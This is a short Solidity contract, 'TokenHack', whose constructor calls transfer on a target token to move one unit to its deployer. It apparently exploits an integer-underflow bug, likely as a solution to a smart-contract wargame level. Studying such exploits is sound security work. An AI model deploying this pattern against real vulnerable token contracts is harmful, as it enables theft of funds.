// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken{
   function balanceOf(address) external view returns(uint256);
   function transfer(address _to, uint _value) external returns (bool);
  
}
contract TokenHack{
     constructor(address _target){
     IToken(_target).transfer(msg.sender, 1);
   }
}
